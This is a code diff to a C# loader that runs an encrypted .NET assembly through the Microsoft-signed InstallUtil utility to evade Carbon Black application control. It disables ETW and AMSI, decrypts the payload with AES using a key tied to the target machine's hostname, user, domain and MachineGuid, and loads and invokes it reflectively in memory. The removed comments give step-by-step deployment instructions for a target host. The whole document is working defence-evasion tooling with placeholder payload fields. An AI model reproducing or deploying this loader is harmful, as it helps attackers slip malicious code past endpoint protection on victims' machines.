@@ -1,32 +1,16 @@
-// InstallUtil Payload — alternative LOLBin for Carbon Black bypass
-//
-// Workflow:
-//   1. python encrypt_payload.py xor YourTool.exe --format cs
-//   2. Paste byte arrays into the PAYLOAD SECTION below
-//   3. Compile on your attack box (Mono works):
-//        mcs -target:library -out:payload.dll installutil_payload.cs
-//      Or with MinGW's .NET support / cross-compile with Mono:
-//        mcs -target:library -r:System.Configuration.Install -out:payload.dll installutil_payload.cs
-//   4. Transfer payload.dll to target
-//   5. Run via InstallUtil (Microsoft-signed, whitelisted by CB):
-//        C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll
-//
-// The /U flag calls the Uninstall() method. /logfile= suppresses the log file.
-// InstallUtil is a .NET Framework utility, Microsoft-signed, and typically
-// whitelisted by Carbon Black App Control.
-
 using System;
 using System.ComponentModel;
 using System.Configuration.Install;
 using System.Reflection;
 using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+using System.Text;
 
 namespace Payload
 {
     [RunInstaller(true)]
     public class Loader : Installer
     {
-        // P/Invoke
         [DllImport("kernel32.dll")]
         static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 
@@ -80,64 +64,159 @@ namespace Payload
             catch { return false; }
         }
 
-        static byte[] XorDecrypt(byte[] data, byte[] key)
+        static byte[] AesDecrypt(byte[] data, byte[] key, byte[] iv)
         {
-            byte[] result = new byte[data.Length];
-            for (int i = 0; i < data.Length; i++)
-                result[i] = (byte)(data[i] ^ key[i % key.Length]);
-            return result;
+            using (RijndaelManaged aes = new RijndaelManaged())
+            {
+                aes.Key = key;
+                aes.IV = iv;
+                aes.Mode = CipherMode.CBC;
+                aes.Padding = PaddingMode.PKCS7;
+                ICryptoTransform decryptor = aes.CreateDecryptor();
+                return decryptor.TransformFinalBlock(data, 0, data.Length);
+            }
         }
 
-        // ================================================================
-        //  PAYLOAD SECTION — paste from encrypt_payload.py
-        // ================================================================
+        static byte[] DeriveKey(string saltB64, string keying)
+        {
+            byte[] salt = Convert.FromBase64String(saltB64);
+            string[] props = keying.Split(new char[] { ',' }, StringSplitOptions.RemoveEmptyEntries);
+            Array.Sort(props);
 
-        static byte[] encryptedAssembly = new byte[] {
-            // PASTE ENCRYPTED ASSEMBLY BYTES HERE
-            0x00  // placeholder
-        };
+            StringBuilder sb = new StringBuilder();
+            foreach (string prop in props)
+            {
+                string p = prop.Trim().ToLowerInvariant();
+                string val = "";
+                if (p == "hostname")
+                    val = Environment.MachineName;
+                else if (p == "domain")
+                    val = Environment.UserDomainName;
+                else if (p == "user")
+                    val = Environment.UserName;
+                else if (p == "machineguid")
+                {
+                    try
+                    {
+                        using (var rk = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(
+                            "SOFTWARE\\Microsoft\\Cryptography"))
+                        {
+                            if (rk != null)
+                                val = rk.GetValue("MachineGuid", "").ToString();
+                        }
+                    }
+                    catch { }
+                }
+                sb.Append(p).Append("=").Append(val.ToUpperInvariant()).Append("\n");
+            }
 
-        static byte[] xorKey = new byte[] {
-            // PASTE XOR KEY HERE
-            0x00  // placeholder
-        };
+            byte[] data = Encoding.UTF8.GetBytes(sb.ToString());
+            byte[] combined = new byte[salt.Length + data.Length];
+            Buffer.BlockCopy(salt, 0, combined, 0, salt.Length);
+            Buffer.BlockCopy(data, 0, combined, salt.Length, data.Length);
 
-        // ================================================================
-        //  ARGUMENTS SECTION
-        // ================================================================
+            using (SHA256 sha = SHA256.Create())
+            {
+                byte[] result = sha.ComputeHash(combined);
+                Array.Clear(combined, 0, combined.Length);
+                Array.Clear(data, 0, data.Length);
+                return result;
+            }
+        }
+
+        static string ENCRYPTED_B64 = "YOURPAYLOADHERE";
+        static string KEY_B64 = "YOURKEYHERE";
+        static string IV_B64 = "YOURIVHERE";
+        static string KEYING = "YOURKEYINGHERE";
+        static string SALT_B64 = "YOURSALTHERE";
+
+        static string TARGET_TYPE = "YOURTYPEHERE";
+        static string TARGET_METHOD = "YOURMETHODHERE";
 
         static string[] assemblyArgs = new string[] {
-            // "-group=all",
+            // YOURARGS
         };
 
-        // ================================================================
-        //  Entry — called by InstallUtil /U
-        // ================================================================
+        static void InvokeMethod(MethodInfo method, object instance)
+        {
+            ParameterInfo[] parms = method.GetParameters();
+            if (parms.Length == 0)
+                method.Invoke(instance, null);
+            else if (parms.Length == 1 && parms[0].ParameterType == typeof(string[]))
+                method.Invoke(instance, new object[] { assemblyArgs });
+            else
+                method.Invoke(instance, null);
+        }
 
         public override void Uninstall(System.Collections.IDictionary savedState)
         {
             PatchEtw();
             PatchAmsi();
 
-            byte[] clearAssembly = XorDecrypt(encryptedAssembly, xorKey);
+            byte[] encrypted = Convert.FromBase64String(ENCRYPTED_B64);
+
+            byte[] key;
+            if (KEYING.Length > 0)
+                key = DeriveKey(SALT_B64, KEYING);
+            else
+                key = Convert.FromBase64String(KEY_B64);
+            byte[] iv = Convert.FromBase64String(IV_B64);
+
+            byte[] clearAssembly;
+            try
+            {
+                clearAssembly = AesDecrypt(encrypted, key, iv);
+            }
+            catch (CryptographicException)
+            {
+                Console.Error.WriteLine("Decryption failed -- key mismatch (wrong target?)");
+                return;
+            }
+
+            Array.Clear(encrypted, 0, encrypted.Length);
+            Array.Clear(key, 0, key.Length);
+            Array.Clear(iv, 0, iv.Length);
 
             try
             {
                 Assembly asm = Assembly.Load(clearAssembly);
-                MethodInfo entry = asm.EntryPoint;
 
-                if (entry != null)
+                if (TARGET_TYPE.Length > 0 && TARGET_METHOD.Length > 0)
                 {
-                    ParameterInfo[] parms = entry.GetParameters();
-                    if (parms.Length == 0)
-                        entry.Invoke(null, null);
+                    Type t = asm.GetType(TARGET_TYPE);
+                    if (t == null)
+                        throw new Exception("Type not found: " + TARGET_TYPE);
+
+                    BindingFlags flags = BindingFlags.Public | BindingFlags.NonPublic
+                        | BindingFlags.Static | BindingFlags.Instance;
+                    MethodInfo method = t.GetMethod(TARGET_METHOD, flags);
+                    if (method == null)
+                        throw new Exception("Method not found: " + TARGET_TYPE + "." + TARGET_METHOD);
+
+                    if (method.IsStatic)
+                    {
+                        InvokeMethod(method, null);
+                    }
                     else
-                        entry.Invoke(null, new object[] { assemblyArgs });
+                    {
+                        object instance = Activator.CreateInstance(t);
+                        InvokeMethod(method, instance);
+                    }
+                }
+                else
+                {
+                    MethodInfo entry = asm.EntryPoint;
+                    if (entry != null)
+                        InvokeMethod(entry, null);
                 }
             }
             catch (TargetInvocationException ex)
             {
-                Console.Error.WriteLine(ex.InnerException?.ToString());
+                Console.Error.WriteLine(ex.InnerException != null ? ex.InnerException.ToString() : ex.ToString());
+            }
+            catch (Exception ex)
+            {
+                Console.Error.WriteLine(ex.ToString());
             }
             finally
             {
